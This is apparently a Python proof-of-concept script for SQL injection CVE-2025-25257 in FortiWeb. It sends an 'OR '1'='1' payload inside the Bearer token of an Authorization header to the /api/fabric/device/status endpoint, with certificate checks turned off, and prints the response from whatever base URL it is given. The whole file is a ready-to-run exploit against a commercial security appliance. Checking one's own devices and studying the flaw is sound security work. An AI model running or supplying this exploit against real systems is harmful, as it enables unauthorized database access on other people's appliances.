import requests

def test_sqli(base_url):
    url = f"{base_url}/api/fabric/device/status"
    headers = {
        "Authorization": "Bearer aaa' OR '1'='1"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        print(f"Status code: {response.status_code}")
        print("Response body:")
        print(response.text)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="PoC SQLi CVE-2025-25257 FortiWeb")
    parser.add_argument("base_url", help="Base URL of FortiWeb (ex: https://10.0.0.5)")
    args = parser.parse_args()
    test_sqli(args.base_url)
